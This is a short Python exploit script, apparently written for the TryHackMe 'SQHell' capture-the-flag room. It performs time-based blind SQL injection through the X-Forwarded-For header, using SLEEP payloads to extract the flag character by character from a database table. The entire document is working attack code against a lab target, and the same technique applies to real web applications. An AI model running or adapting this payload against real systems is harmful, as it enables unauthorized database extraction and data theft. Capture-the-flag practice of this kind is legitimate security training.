#+--------------------------------------------------
# Exploit for Time based SQLi (SQHell THM) FLAG 2
#+--------------------------------------------------
import requests
import time
i=1
TIMELIMIT=5 #Time limit
EXTRACTED='THM{FLAG2:' #Using Flag template
IP='10.10.21.43' #Enter IP Here
while i<=32:
    for j in range(48,71):
        if j in range(58,65): #Only Hex Character to save time
            pass
        else:
            start=time.time() #Start timer
            PAYLOAD="1' AND (SELECT 1 FROM (SELECT(SLEEP(%s-(IF(SUBSTR((SELECT flag from sqhell_1.flag),1,%s)='%s',0,%s)))))XyZk) AND '1'='1"%(TIMELIMIT,10+i,EXTRACTED+chr(j),TIMELIMIT) #Payload Generation
            header={"X-Forwarded-For":PAYLOAD}
            requests.get(url="http://%s/"%IP,headers=header) #Send GET request with 'X-Forwarded-For' header.
            end=time.time() #End Timer
            print("Did ",chr(j)," in ",end-start)
            if end-start>=TIMELIMIT: #Comparing time taken
                EXTRACTED+=chr(j)
                print(EXTRACTED)
                break
            if j==70:
                exit("Error: Couldn't find matching character! Try Increasing time limit!")
    i+=1    
print("FLAG is: ", EXTRACTED+"}")